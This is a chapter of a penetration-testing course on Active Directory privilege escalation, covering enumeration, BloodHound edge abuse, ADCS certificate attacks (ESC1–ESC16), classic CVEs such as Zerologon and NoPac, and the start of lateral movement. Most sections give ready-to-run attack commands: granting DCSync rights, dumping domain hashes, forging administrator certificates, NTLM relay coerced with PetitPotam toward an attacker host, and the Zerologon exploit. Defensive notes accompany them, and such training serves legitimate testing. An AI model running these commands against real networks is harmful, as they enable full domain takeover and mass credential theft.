---
title: "14. Domain Escalation and Persistence"
order: 14
part: "Post-Exploitation & Active Directory"
description: "AD enumeration, BloodHound, ADCS (ESC) attacks, classic CVEs, lateral movement and persistence."
---

> **Scope note:** the Kerberos attack techniques themselves (AS-REP Roasting, Kerberoasting, Pass-the-Ticket, Overpass-the-Hash, the *production mechanics* of Golden/Silver Ticket tickets, the mechanics of delegation abuse) are covered in **Section 13**. Here we only refer to these techniques in the *context* of AD privilege escalation/persistence and by number (see Section 13); we do not repeat the production commands. The protocol detail of NTLM relay and the `ntlmrelayx` flow are in **Section 11** (ESC8 here only references it).

---

## 14.1 Active Directory basic concepts

AD is the central identity and authorization directory in Windows networks. It is queried via LDAP (389/636), authenticates with Kerberos (88) and NTLM, provides sharing/replication over SMB (445), and does service discovery via DNS (53) (`_ldap._tcp`, SRV records). The attacker must understand the "why": every privesc path is a misconfiguration of these objects and relationships.

### Domain / Tree / Forest / OU

| Concept | Definition | Attack significance |
| --- | --- | --- |
| **Domain** | A set of objects that do *not* share a common directory database and security boundary but share policy/replication (e.g. `corp.local`) | Not a Kerberos/NTLM identity boundary; the real security boundary is the **forest** |
| **Tree** | A chain of domains that share a contiguous DNS namespace (`corp.local` to `eu.corp.local`) | Parent-child trust is automatic and two-way/transitive |
| **Forest** | One or many trees; the **true security boundary**. Common schema, configuration partition, Global Catalog | Enterprise Admins span the whole forest; the forest = the "full takeover" target |
| **OU (Organizational Unit)** | A container that groups objects and that **GPOs are applied to** | A write/GPLink right over an OU, means code execution via GPO |

### DC, NTDS.dit, SYSVOL

- **Domain Controller (DC):** the server that hosts the AD database and the Kerberos **KDC** (Key Distribution Center). In practice, taking over DA means "SYSTEM/directory write on the DC".
- **NTDS.dit:** the `C:\Windows\NTDS\ntds.dit` on the DC, an ESE database that holds the **NT hashes** of all domain users (and the krbtgt hash). If it is captured, the passwords of the whole domain are pulled. Offline extraction: `ntdsutil` "IFM" snapshot, a VSS copy, or DCSync.
- **SYSVOL:** `\\<domain>\SYSVOL`, a replicated share readable by all domain users where GPOs and login scripts live. The old **GPP cpassword** inside it (see 14.2) is a classic privesc source.
- **Global Catalog (GC):** a partial forest-wide directory copy on port 3268/3269; for forest-wide enumeration.

### FSMO roles (brief)

Five "single-owner" roles; know them only as a concept (most attacks progress via hash/ACL, not role seizure):

| Role | Scope | Note |
| --- | --- | --- |
| Schema Master | Forest | Schema changes |
| Domain Naming Master | Forest | Add/remove domains |
| RID Master | Domain | Distributes the RID pool |
| PDC Emulator | Domain | Time sync, password, the most critical role |
| Infrastructure Master | Domain | Cross-domain references |

### SID / RID and well-known RIDs

Every security object has a **SID** (Security Identifier): `S-1-5-21-<domain>-<RID>`. The last part, the **RID**, is specific to the object. Well-known RIDs/SIDs to memorize:

| RID | Object | Privesc significance |
| --- | --- | --- |
| 500 | Built-in Administrator | Target #1; exempt from UAC remote restriction |
| 501 | Guest | For anonymous/null enum |
| 502 | **krbtgt** | The Golden Ticket key (see Section 13) |
| 512 | Domain Admins | Full authority across the domain |
| 513 | Domain Users | Everyone |
| 516 | Domain Controllers | DC machine accounts (can DCSync) |
| 518 | Schema Admins | Schema write (indirectly powerful) |
| 519 | Enterprise Admins | Full authority across the **forest** |
| 520 | Group Policy Creator Owners | GPO creation |
| 525 | Protected Users | (a defensive group) |
| S-1-5-18 | LocalSystem | SYSTEM on the host |

**Note:** RID 500 = Administrator, 512 = Domain Admins, 519 = Enterprise Admins (forest), 502 = krbtgt. "The most privileged group in the forest" is Enterprise Admins, not Domain Admins. The security boundary is not the domain but the **forest**.

### Trust relationships and SID History

A trust is one domain trusting another's identities. By direction and transitivity:

| Trust type | Direction/transitivity | Note |
| --- | --- | --- |
| Parent-child | two-way, transitive, automatic | Within the same forest; when the forest is taken over, all of it |
| Tree-root | two-way, transitive | Same forest, different tree |
| External | one/two-way, **non-transitive** | To a single domain in a different forest; SID filtering by default |
| Forest trust | two-way/one-way, transitive (within the forest) | Between two forest roots |
| Shortcut/realm | - | Optimization / MIT Kerberos |

- **SID History (`sIDHistory`):** a field for "inheriting" a SID into an account from another domain/forest. Legitimate for migration, but if an attacker injects, for example, the Enterprise Admins SID here (with a Golden Ticket, see Section 13), it escalates privileges cross-domain. **SID filtering** cleans this up at the forest boundary; in intra-forest trusts it is disabled by default, which is critical for intra-forest lateral movement.
- **Internal forest takeover:** escalating from child domain DA to forest root Enterprise Admin via krbtgt + SID History (519) injection is a classic technique (see Section 13, Golden Ticket + extra SIDs).

**Note:** "The domain is not the security boundary; the forest is." An attacker who takes over a child domain can move to the forest root via SID History/Golden Ticket, because intra-forest SID filtering is not applied by default.

### Important groups and privesc potential

Each one, knowing *why* it is dangerous:

| Group | Authority / privesc path |
| --- | --- |
| **Domain Admins** (512) | Full administration in the domain; admin on the DC. The ultimate target. |
| **Enterprise Admins** (519) | Full administration across the whole forest. |
| **Administrators** (built-in) | Local admin on the DC = domain administration. |
| **Account Operators** | Manages most users/groups (except protected groups). Reset the password of low-privileged accounts and take over their rights; create new accounts. |
| **Server Operators** | Manages services on the DC, so change a service binPath and run commands as SYSTEM (`sc config`). |
| **Backup Operators** | `SeBackupPrivilege`/`SeRestorePrivilege`, so copy NTDS.dit and SAM/SYSTEM as a backup and pull hashes. On the DC = domain takeover. |
| **Print Operators** | `SeLoadDriverPrivilege`, so load a malicious driver for privesc; right to log on locally to the DC. |
| **DnsAdmins** | Make the DNS service (SYSTEM, usually on the DC) load an arbitrary **DLL**, so SYSTEM code execution (see the dnscmd technique in 14.5). |
| **Schema Admins** | Manipulate the default ACL/defaultSecurityDescriptor via a schema change (indirect, persistent). |
| **Group Policy Creator Owners** | If they can create a new GPO and link it to an OU, code execution. |
| **DHCP Administrators / Cert Publishers / Remote Desktop Users** | State-dependent paths (ADCS, RDP access). |

**Note:** "quiet" privesc groups are asked about often: **Backup Operators** to an NTDS.dit copy; **Server Operators** to a service binPath; **DnsAdmins** to a DLL; **Account Operators** to account/password management. These lead to DA without being DA.

### GPO (Group Policy)

A GPO is an object that distributes machine/user settings; it is linked to an OU/site/domain with a **GPLink**. A write right over a GPO, or a GPLink right over an OU, means code execution by pushing a **scheduled task/startup script/immediate task** to the machines in that scope (tools: `SharpGPOAbuse`, `pyGPOAbuse`). This is both privesc and persistence (see 14.7).

```
# BloodHound GPO istismar edilebilir mi? → GpLink/GenericWrite on GPO edge'i
SharpGPOAbuse.exe --AddComputerTask --TaskName "update" --Author corp\admin \
  --Command "cmd.exe" --Arguments "/c net localgroup administrators corp\lowpriv /add" \
  --GPOName "Default Domain Policy"
```

**Detection/Defense:** a GPO change is Event ID **5136** (directory object changed) and a file write in SYSVOL. Restrict GPO edit rights to Tier-0; monitor changes under gpoGuid.

---

## 14.2 AD enumeration (unauthenticated to authenticated)

Enumeration is 80% of privesc. Two phases: (a) **unauthenticated/anonymous** (no account yet), (b) **authenticated** (any domain user has been obtained, so LDAP is now fully open).

### Unauthenticated / null / low-privileged

```
# enum4linux-ng: SMB/RPC/LDAP toplu enum (klasik enum4linux'un modern halefi)
enum4linux-ng -A 10.10.10.10            # -A = all modules (users, groups, shares, pol, os)

# rpcclient null session (MS-RPC / 445)
rpcclient -U '' -N 10.10.10.10
  > querydominfo          # domain name, SID, user count, lockout policy
  > enumdomusers          # user list (with RID)
  > enumdomgroups         # group list
  > queryuser 0x1f4       # RID 500 (Administrator) detail
  > getdompwinfo          # password policy

# NetExec (nxc; formerly CrackMapExec) - user discovery via RID brute
nxc smb 10.10.10.10 -u guest -p '' --rid-brute 10000    # SID→name with guest/null
nxc smb 10.10.10.10 -u '' -p '' --users                 # null session users

# impacket-lookupsid: extract users/groups via SID brute
impacket-lookupsid anonymous@10.10.10.10 | tee users.txt
impacket-lookupsid corp.local/guest@10.10.10.10         # kimlikli varyant

# Anonymous LDAP (open on some DCs)
ldapsearch -x -H ldap://10.10.10.10 -s base namingcontexts   # base DN discovery
ldapsearch -x -H ldap://10.10.10.10 -b "dc=corp,dc=local"    # anonymous dump (if open)
```

**Flag notes:** `-U '' -N` = null user + do not ask for a password. `--rid-brute` scans the RID range and converts SID to name (the most reliable way to discover users while unauthenticated). `-A` is "all" in enum4linux-ng. impacket-lookupsid works with null/guest, because SAMR/LSAT RID resolution is anonymously open on most DCs.

### Authenticated enum (once a domain user is obtained)

```
# NetExec - fastest bulk enum
nxc smb DC -u user -p 'Pass123' --users --groups --shares --pass-pol --loggedon-users
nxc smb DC -u user -H <NThash> --users              # Enum with Pass-the-Hash
nxc ldap DC -u user -p 'Pass123' --users --groups
nxc ldap DC -u user -p 'Pass123' --kerberoasting kerb.out   # find accounts with SPNs (see Section 13)
nxc ldap DC -u user -p 'Pass123' --asreproast asrep.out     # pre-auth-disabled accounts (Section 13)
nxc ldap DC -u user -p 'Pass123' --bloodhound -c all --dns-server <DC_IP>

# ldapsearch (kimlikli)
ldapsearch -x -H ldap://DC -D 'user@corp.local' -w 'Pass123' -b 'dc=corp,dc=local' \
  '(objectClass=user)' sAMAccountName memberOf servicePrincipalName

# ldapdomaindump - HTML/JSON directory dump (users, groups, computers, trusts, policy)
ldapdomaindump -u 'corp\user' -p 'Pass123' DC -o loot/

# windapsearch - ready-made queries
windapsearch -d corp.local --dc-ip 10.10.10.10 -u user -p Pass123 -m privileged-users
windapsearch -d corp.local --dc-ip 10.10.10.10 -u user -p Pass123 -m computers

# adidnsdump - dump AD-integrated DNS records (internal host discovery)
adidnsdump -u corp\\user -p Pass123 10.10.10.10

# PowerView / SharpView (on host, PowerShell)
powershell -ep bypass
Import-Module .\PowerView.ps1
Get-DomainUser -SPN | select samaccountname          # Kerberoastable
Get-DomainUser -PreauthNotRequired                   # AS-REP roastable
Get-DomainComputer -Unconstrained                    # unconstrained delegation
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'}
Find-InterestingDomainAcl -ResolveGUIDs
Get-NetGPO; Get-DomainGPOLocalGroup                  # who is admin where, via GPO

# adPEAS - automatic "privesc-oriented" enum on top of PowerView
Invoke-adPEAS
```

**Decision guide:** while unauthenticated, collect a user list with `enum4linux-ng` + `--rid-brute` + `impacket-lookupsid`, then try AS-REP Roasting (Section 13) or password spraying (see below in 14.2). Once you obtain a credential, immediately run `nxc --bloodhound -c all` and `ldapdomaindump`; open the graph in BloodHound.

### SYSVOL GPP cpassword (classic, still shows up)

Local administrator passwords distributed via the old "Group Policy Preferences" (GPP) are stored in XML files in SYSVOL in a form where **the AES key was published publicly by MS**, so anyone can decrypt them.

```
# search for cpassword in SYSVOL (every domain user can read SYSVOL)
# Files: Groups.xml, Services.xml, ScheduledTasks.xml, Printers.xml, Drives.xml, DataSources.xml
nxc smb DC -u user -p Pass123 -M gpp_password          # automatically scan + decrypt
nxc smb DC -u user -p Pass123 -M gpp_autologin         # autologon stored credential

# Manuel
findstr /S /I cpassword \\corp.local\sysvol\corp.local\policies\*.xml
gpp-decrypt "j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw"   # decrypt AES
```

**Detection/Defense:** MS14-025 patched GPP cpassword, but old XML files can remain in SYSVOL; clean them up. Use LAPS. Monitor abnormal scans of SYSVOL reads.

**Note:** the `cpassword` field inside `Groups.xml` is encrypted with the fixed AES-256 key MS published; `gpp-decrypt` decrypts it instantly. Because any low-privileged user can read SYSVOL, this is privilege escalation.

### Password spraying (combines with the account list from enum)

```
nxc smb DC -u users.txt -p 'Winter2025!' --continue-on-success   # one password, many users
nxc smb DC -u users.txt -p passwords.txt --no-bruteforce         # not pairing, spray
# CAUTION: learn the lockout policy first (getdompwinfo / --pass-pol); lockout = noise/DoS
```

**Note:** before spraying, learn the lockout threshold with `--pass-pol`; otherwise you will lock accounts (both detection and loss of access). One password times many users = spray; many passwords times one user = brute force.

---

## 14.3 BloodHound: attack path analysis

BloodHound is a graph tool that models AD objects (user, group, computer, OU, GPO, CA) as **nodes** and the rights between them as **edges**. It answers the question "the shortest path from low-privileged X to Domain Admin" with a Cypher query. A *collector* pulls the data over LDAP/SMB, and the GUI shows it in a Neo4j graph.

### Versions: CE vs legacy

- **BloodHound CE (Community Edition, 2023+):** the current version. Runs with Docker Compose (`docker-compose up`), a web interface (`http://localhost:8080`), PostgreSQL + Neo4j backend. Collector: **SharpHound** (v2) and **AzureHound**. Edge names were renewed/expanded.
- **Legacy BloodHound (4.x):** Electron GUI + bare Neo4j; SharpHound v1. Still seen in the field and in older material. Query/edge logic is similar.

### Collection

```
# Windows, on a domain-joined host (the richest data)
SharpHound.exe -c All                         # all collection methods
SharpHound.exe -c All,GPOLocalGroup --zipfilename loot
# Collection methods: Group, LocalAdmin, RDP, DCOM, Session, ACL, Trusts, Container,
# GPOLocalGroup, LoggedOn, ObjectProps, SPNTargets, Cert (CARegistry/CertServices for ADCS)

# Linux, kimlikli (uzaktan)
bloodhound-python -u user -p 'Pass123' -d corp.local -ns 10.10.10.10 -c All --zip
bloodhound-python -u user -p 'Pass123' -d corp.local -ns 10.10.10.10 -c All,DCOnly   # low noise

# can also be pulled from Certipy for ADCS data (import into BloodHound):
certipy find -u user@corp.local -p Pass123 -dc-ip 10.10.10.10 -bloodhound
```

`-c All` = all collection; `-c DCOnly` only LDAP queries to the DC (does not touch hosts, so quiet, but no session/localadmin data comes back). Upload the ZIP to the CE interface.

### Critical edges and the abuse of EACH ONE

This table is the heart of the matter: when you see an edge, know what to do.

| Edge | What it means | Abuse |
| --- | --- | --- |
| **GenericAll** (user) | Full control over the target user | Reset the password; or **targeted Kerberoast** (add an SPN then roast, see Section 13); or **Shadow Credentials** (msDS-KeyCredentialLink) |
| **GenericAll** (computer) | Full control over the computer object | **RBCD** (set up resource-based constrained delegation, see Section 13); or Shadow Credentials to a machine TGT/hash |
| **GenericAll** (group) | Full control over the group | **AddMember**: add yourself to the group (e.g. Domain Admins) |
| **GenericWrite** (user) | Write most attributes | Write an SPN then targeted Kerberoast; or write a logonScript; or Shadow Credentials |
| **GenericWrite** (computer) |  | `msDS-AllowedToActOnBehalfOfOtherIdentity` for Shadow Credentials / RBCD |
| **WriteDacl** | Change the object's DACL | Add a GenericAll/DCSync right for yourself (`Add-DomainObjectAcl`) |
| **WriteOwner** | Take ownership of the object | Become owner then write the DACL then full control |
| **Owns** | Already the owner | Write the DACL |
| **ForceChangePassword** | Reset the password *without knowing it* | Change the target's password (can break accounts with an open session, be careful) |
| **AddMember** | Add a member to a group | Add yourself to the DA/EA group |
| **AddSelf** | Add yourself to a group | Self-join a group |
| **AddKeyCredentialLink** | Write msDS-KeyCredentialLink | **Shadow Credentials** (Whisker/certipy) |
| **AllowedToDelegate** | Constrained delegation | Access the target service via S4U2proxy (Section 13) |
| **AllowedToAct** | RBCD configured | SYSTEM on the target machine via S4U (Section 13) |
| **ReadLAPSPassword** | Read the LAPS local admin password | Read `ms-Mcs-AdmPwd` then local admin on the host |
| **ReadGMSAPassword** | Read the gMSA password | Read `msDS-ManagedPassword` then identity as the gMSA account (see 14.7 Golden gMSA) |
| **DCSync** (GetChanges + GetChangesAll) | Replication right | Pull all hashes (including krbtgt), see below |
| **GPLink / WriteGPLink** | GPO linking | Link a malicious GPO to an OU then code execution |
| **CanPSRemote / CanRDP / ExecuteDCOM** | Access | Lateral movement (14.6) |
| **HasSession** | A user has a session on that host | Take over the host then steal the token/hash (Section 13 PtT) |

### Abuse examples (commands)

```
# WriteDacl → grant yourself DCSync rights, then DCSync
# (PowerView)
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity lowpriv \
  -Rights DCSync
# (impacket, uzaktan DACL)
impacket-dacledit -action write -rights DCSync -principal lowpriv \
  -target-dn 'DC=corp,DC=local' corp.local/user:Pass123

# GenericAll on group → AddMember
net rpc group addmem "Domain Admins" lowpriv -U corp.local/user%Pass123 -S DC
# or PowerView:
Add-DomainGroupMember -Identity 'Domain Admins' -Members lowpriv

# ForceChangePassword
net rpc password targetuser 'NewPass123!' -U corp.local/user%Pass123 -S DC
# (impacket)
impacket-changepasswd corp.local/targetuser@DC -newpass 'NewPass!' -altuser user -altpass Pass123 -reset

# GenericWrite on user → targeted Kerberoast (add SPN, roast, remove SPN) - mechanics in Section 13
targetedKerberoast.py -u user -p Pass123 -d corp.local --request-user targetuser

# DCSync (once you hold replication rights - all hashes, including krbtgt)
impacket-secretsdump -just-dc corp.local/user:Pass123@DC
impacket-secretsdump -just-dc-user krbtgt corp.local/user:Pass123@DC
nxc smb DC -u user -p Pass123 --ntds                 # via LSASS/NTDS (admin required)
```

### Shadow Credentials (a prominent modern technique)

An attacker-controlled Key Credential (a public/private pair) is written into the target's **`msDS-KeyCredentialLink`** attribute (where public keys are held); then via **Kerberos PKINIT** a TGT is obtained on behalf of that account, and the NT hash is extracted with **UnPAC-the-hash**. Quiet account takeover without resetting the password. Prerequisite: a GenericWrite/GenericAll/AddKeyCredentialLink right + the domain supporting Key Trust (DC Server 2016+, usually ADCS/PKINIT).

```
# certipy - add→PKINIT→hash→cleanup in a single command
certipy shadow auto -u user@corp.local -p Pass123 -account targetuser -dc-ip 10.10.10.10
# manual steps
certipy shadow add  -u user@corp.local -p Pass123 -account targetuser -dc-ip 10.10.10.10
certipy auth -pfx targetuser.pfx -dc-ip 10.10.10.10       # TGT + NT hash

# pyWhisker (Linux) - attribute management
pywhisker -d corp.local -u user -p Pass123 --target targetuser --action add
# Whisker.exe (Windows C#)
Whisker.exe add /target:targetuser /domain:corp.local /dc:dc01.corp.local
```

**Detection/Defense:** a change to `msDS-KeyCredentialLink` is Event ID **5136** (directory object changed), so monitor writes to this attribute. Remove GenericWrite/AddKeyCredentialLink rights on Tier-0 objects. A TGT obtained via PKINIT: 4768 (cert-based logon). Disable Key Trust in environments where it is not needed.

**Note:** GenericAll/GenericWrite over a *user* opens three paths: (1) reset the password, (2) add an SPN for targeted Kerberoast, (3) Shadow Credentials. Over a *computer*, it is RBCD or Shadow Credentials to identity as the machine. BloodHound's built-in queries: "Shortest Paths to Domain Admins", "Find Principals with DCSync Rights", "Shortest Path from Owned Principals".

**Detection/Defense (BloodHound in general):** collection produces heavy LDAP/SMB query scanning (a large number of 4661/4662 and SAMR); honey-token accounts and ACL anomaly monitoring. The defense is primarily to **break the attack paths**: clean up unnecessary ACLs, apply a Tier model.

---

## 14.4 AD Certificate Services (ADCS) attacks: ESC

ADCS is the PKI that issues certificates in the domain. Misconfigured **certificate templates** and **CA rights** provide privilege escalation and strong **persistence**: certificate-based identity is quieter than PtH and **is not affected by a password change** (it works for the certificate's validity period, which can be years). The techniques were cataloged by SpecterOps's "Certified Pre-Owned" research as **ESC1 to ESC8**, by the Certipy author (ly4k) as **ESC9 to ESC11**, and later as ESC13/ESC15/ESC16. In practice **ESC1, ESC4, ESC8** are seen most.

### Discovery

```
certipy find -u user@corp.local -p Pass123 -dc-ip 10.10.10.10 -vulnerable -stdout
certipy find -u user@corp.local -p Pass123 -dc-ip 10.10.10.10 -vulnerable -enabled -stdout
# output: CAs, templates, and the ESC class detected for each (ESC1..). Produces JSON/txt.
# for ADCS edges in BloodHound:
certipy find -u user@corp.local -p Pass123 -dc-ip 10.10.10.10 -bloodhound
```

`-vulnerable` only the templates that can be exploited; `-enabled` only those published on the CA; `-stdout` prints to the screen. Note: in some versions the binary is named `certipy-ad`.

### ESC classes (table)

| ESC | Vulnerability | Short abuse |
| --- | --- | --- |
| **ESC1** | Template with enroll permission for low-privileged users + **ENROLLEE_SUPPLIES_SUBJECT** (specify SAN/UPN) + Client Auth EKU | Request a certificate with another user's (DA's) UPN then identity as that user |
| **ESC2** | Template EKU is **Any Purpose** or no EKU (SubCA) | A certificate usable for any purpose then identity/sub-CA |
| **ESC3** | Template with the **Enrollment Agent** EKU | First obtain an agent certificate, then enroll "on behalf of" someone else |
| **ESC4** | **Write right** in the template ACL | Turn the template into ESC1 (allow SAN), exploit it, revert |
| **ESC5** | Weak ACLs on PKI objects (the CA computer object, containers) | Object control then CA takeover |
| **ESC6** | The **EDITF_ATTRIBUTESUBJECTALTNAME2** flag is set on the CA | Specify an arbitrary SAN with any template (like ESC1 but CA-wide) |
| **ESC7** | **ManageCA / Manage Certificates** right for low-privileged users | ManageCA then set the EDITF flag (ESC6), or enroll the SubCA template + approve a pending request |
| **ESC8** | The CA's **HTTP web enrollment** endpoint (NTLM) is open | Coerce the DC machine account then **NTLM relay** to `/certsrv` then a DC certificate (see Section 11) |
| **ESC9** | **CT_FLAG_NO_SECURITY_EXTENSION** on the target template (no szOID security extension) | Identity via UPN with weak cert mapping (strong mapping bypass, Kerberos) |
| **ESC10** | Weak certificate mapping registry values (Schannel / `CertificateMappingMethods`) | Account takeover via UPN/Schannel |
| **ESC11** | No signing enforcement on the CA RPC endpoint (IF_ENFORCEENCRYPTICERTREQUEST) | **NTLM relay to RPC** (the RPC version of ESC8) |
| **ESC13** | An **OID group link** bound to a template (issuance policy to an AD group) | On obtaining a certificate, the membership rights of that group |
| **ESC15 (CVE-2024-49019, "EKUwu")** | Application policy injection in V1 templates | Identity via SAN/EKU injection (new class; with Certipy) |
| **ESC16** | The security extension globally disabled on the CA | ESC9-like global weak mapping (new class) |

### ESC1: step-by-step worked example

Scenario: `corp.local`, CA = `CORP-CA`, vulnerable template `VulnTemplate` (ESC1), low-privileged `user:Pass123`.

```
# 1) Confirm the vulnerability
certipy find -u user@corp.local -p Pass123 -dc-ip 10.10.10.10 -vulnerable -stdout
#   → [!] Vulnerabilities: ESC1 : 'CORP\\Domain Users' can enroll, enrollee supplies subject...

# 2) request certificate with DA's UPN and SID
# (after the May 2022 strong-mapping patch, -sid is required; certipy adds the SID extension)
certipy req -u user@corp.local -p Pass123 -dc-ip 10.10.10.10 -target CA-HOST \
  -ca CORP-CA -template VulnTemplate \
  -upn administrator@corp.local -sid S-1-5-21-...-500
#   → Saved certificate and private key to 'administrator.pfx'

# 3) Authenticate with the certificate → TGT and NT hash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
#   → Got TGT ; [*] Got hash for 'administrator@corp.local': aad3b...:<NThash>
# → now PtH / DCSync / Golden Ticket (Section 13) are possible
```

**In practice:** the May 2022 patch (KB5014754, CVE-2022-26931/26923) introduced strong certificate-to-account mapping; if you do not supply `-sid` in `certipy req`, auth may fail with "certificate not strongly mapped". Current Certipy versions try to add the SID extension automatically; if that fails, supply `-sid` by hand.

### ESC4: writing to a template

```
# Save the template (to revert), convert it to ESC1, exploit it
certipy template -u user@corp.local -p Pass123 -dc-ip 10.10.10.10 -template VulnTpl \
  -save-configuration backup.json
certipy template -u user@corp.local -p Pass123 -dc-ip 10.10.10.10 -template VulnTpl \
  -write-default-configuration            # put the template into "anyone enroll + SAN" mode (= ESC1)
# → then the ESC1 steps (req -upn ... / auth)
# Restore it when done:
certipy template -u user@corp.local -p Pass123 -dc-ip 10.10.10.10 -template VulnTpl \
  -write-configuration backup.json
```

### ESC7: CA management

```
# if you have ManageCA rights: make yourself an "officer", approve the SubCA template request,
# or enable the EDITF flag (convert to ESC6)
certipy ca -u user@corp.local -p Pass123 -ca CORP-CA -dc-ip 10.10.10.10 -add-officer user
certipy ca -u user@corp.local -p Pass123 -ca CORP-CA -enable-template SubCA
# pending talebi onayla:
certipy ca -u user@corp.local -p Pass123 -ca CORP-CA -issue-request <REQ_ID>
```

### ESC8: NTLM relay to HTTP enrollment

If the CA's web enrollment (`http://ca/certsrv`) endpoint accepts NTLM, you trigger a DC machine account via **coercion** (PetitPotam/PrinterBug, see 14.5) and **relay** its identity to `/certsrv`; it obtains a certificate on behalf of the DC then a DC TGT then DCSync. The entire relay flow is in **Section 11**; here the ADCS side:

```
# Listener: start ntlmrelayx in ADCS mode (details in Section 11)
impacket-ntlmrelayx -t http://CA-HOST/certsrv/certfnsh.asp -smb2support --adcs \
  --template DomainController
# relay server with Certipy too:
certipy relay -target http://CA-HOST -template DomainController
# In a separate terminal, coerce the DC (14.5):
python3 PetitPotam.py -u user -p Pass123 <ATTACKER_IP> <DC_IP>
# → ntlmrelayx captures the DC$ certificate → DC TGT with certipy auth -pfx dc.pfx
```

### Certifried: CVE-2022-26923

In a default installation, any Authenticated User can add a machine account (`ms-DS-MachineAccountQuota=10`). The attacker creates a machine account and makes its `dNSHostName` the same as a DC's name; when a certificate is obtained with the Machine/Computer template, the KDC validates it as if it were the DC then DC authority.

```
# In one command (certipy): add a machine account, collide dNSHostName with the DC, get a cert, authenticate
# (certipy account/req subcommand flags vary by version; verify on the box with `certipy account -h` - must be verified)
certipy account create -u user@corp.local -p Pass123 -dc-ip 10.10.10.10 \
  -user 'EVIL$' -pass 'MachinePass1' -dns dc01.corp.local
certipy req -u 'EVIL$'@corp.local -p 'MachinePass1' -dc-ip 10.10.10.10 \
  -ca CORP-CA -template Machine
certipy auth -pfx dc01.pfx -dc-ip 10.10.10.10         # hash/TGT as the DC
```

**Detection/Defense (ADCS in general):** certificate requests in CA events (CertSvc) and requests containing a UPN in the SAN different from what was requested; certificate-based logon 4768 (PKINIT). Set `ms-DS-MachineAccountQuota=0` (breaks Certifried/NoPac/RBCD). Enforce KB5014754 strong certificate mapping. For ESC8, make HTTPS+EPA (Extended Protection for Authentication) mandatory on web enrollment and disable NTLM. Audit template ACLs (ESC4) and the "Supply in request" (ESC1/ESC6) setting; scan regularly with certipy/PSPKIAudit.

**Note:** ESC1 = "ENROLLEE_SUPPLIES_SUBJECT" on the template (the requester specifies the SAN) + Client Auth; ESC6 = the same effect but CA-wide via the EDITF_ATTRIBUTESUBJECTALTNAME2 flag on the CA; ESC8 = NTLM relay to web enrollment; ESC4 = turning a template into ESC1 with a *write* right. Certificate persistence is not affected by a password change, so even if you reset krbtgt the cert is still valid (you can use this for PKINIT then a new TGT).

---

## 14.5 Classic AD/Windows vulnerabilities (CVEs)

These CVEs can give DA/SYSTEM in a single shot; the patch status is checked in every engagement.

| Vulnerability | CVE | Protocol/component | Impact | Detection tool/module |
| --- | --- | --- | --- | --- |
| **EternalBlue / MS17-010** | CVE-2017-0144 (+0143..0148) | SMBv1 | Remote RCE (SYSTEM) | `nmap --script smb-vuln-ms17-010`; `nxc smb <t> -u '' -p '' -M ms17-010`; Metasploit `ms17_010_eternalblue` |
| **Zerologon** | CVE-2020-1472 | Netlogon (MS-NRPC) | Reset the DC machine account password to `00..0` then DCSync then DA | `nxc smb DC -M zerologon`; `zerologon_tester.py`; Metasploit |
| **PrintNightmare** | CVE-2021-1675 (LPE) + CVE-2021-34527 (RCE) | Print Spooler (MS-RPRN/PAR) | SYSTEM RCE/privesc; DLL via a driver | `nxc smb <t> -M printnightmare`; `CVE-2021-1675.py` (impacket) |
| **NoPac / SamAccountName spoofing** | CVE-2021-42278 (sAMAccountName) + CVE-2021-42287 (PAC/KDC) | Kerberos S4U | Make a machine account resemble the DC name then a TGS on behalf of the DC then DA | `nxc smb DC -M nopac`; `noPac.py -dc-ip ...` |
| **PetitPotam** | (coercion; partial patch CVE-2021-36942) | MS-EFSRPC | Force the DC to authenticate (coercion) then NTLM relay (ESC8) | `nxc smb DC -M coerce_plus`; `PetitPotam.py` |
| **PrinterBug / SpoolSample** | (coercion) | MS-RPRN (Print Spooler) | DC coercion then relay / unconstrained delegation takeover | `printerbug.py`; `coerce_plus` |

### Zerologon: worked example

```
# 1) Vulnerability test (without changing the password)
nxc smb 10.10.10.10 -u '' -p '' -M zerologon
#   → VULNERABLE
# 2) Exploit: set the DC machine account (DC01$) password to empty
python3 cve-2020-1472-exploit.py DC01 10.10.10.10
# 3) DCSync with the empty machine password → all hashes
impacket-secretsdump -no-pass -just-dc 'corp.local/DC01$@10.10.10.10'
# 4) CRITICAL: the DC's password in AD no longer matches the local SAM; restore it immediately!
impacket-secretsdump ...  # get krbtgt + admin hash, then:
python3 reinstall_original_pw.py DC01 10.10.10.10 <hex_from_secretsdump>
```

**Note:** Zerologon zeroes out the DC's machine password in AD, but the mismatch with the local record can break the DC (the domain trust chain is broken). In an engagement the "restore the original password after exploitation" step is critical. Zerologon = **CVE-2020-1472**, a cryptographic flaw in Netlogon AES-CFB8 (all-zero plaintext with IV=0).

### NoPac: worked example

```
nxc smb DC -u user -p Pass123 -M nopac                 # vulnerability check
noPac.py corp.local/user:Pass123 -dc-ip 10.10.10.10 -dc-host DC01 \
  --impersonate administrator -shell                    # DA shell
noPac.py corp.local/user:Pass123 -dc-ip 10.10.10.10 -dc-host DC01 \
  --impersonate administrator -dump                      # DCSync
```

**Detection/Defense:** MS17-010 then disable SMBv1, apply the MS17-010 patch. Zerologon then the August 2020 patch + enforcement; Event 4742 (machine account changed), abnormal Netlogon. PrintNightmare then stop the Spooler on DCs, `RestrictDriverInstallationToAdministrators`. NoPac then `ms-DS-MachineAccountQuota=0`, the 42278/42287 patches; Event 4741/4781 (account created/renamed). PetitPotam/PrinterBug then restrict EFSRPC/Spooler, NTLM relay defense (SMB signing, EPA), patches.

**Note:** memorize the CVE mappings: EternalBlue=MS17-010 (CVE-2017-0144), Zerologon=CVE-2020-1472, PrintNightmare=CVE-2021-1675 (LPE)/CVE-2021-34527 (RCE), NoPac=CVE-2021-42278+42287, Certifried=CVE-2022-26923. PetitPotam is a *coercion* technique (not RCE on its own); its value is in the ESC8/unconstrained delegation relay chain.

---

## 14.6 Lateral movement

Once you obtain a hash/password/ticket, run code on target hosts. Tool selection is made according to the noise/cleanup balance.

```
# WinRM (5985/5986) - temiz, interaktif; tercih edilen
evil-winrm -i host -u administrator -p 'Pass123'
evil-winrm -i host -u administrator -H <NThash>          # Pass-the-Hash
winrs -r:host -u:corp\administrator -p:Pass123 "whoami"  # native Windows tool

# Impacket exec family (over SMB 445)
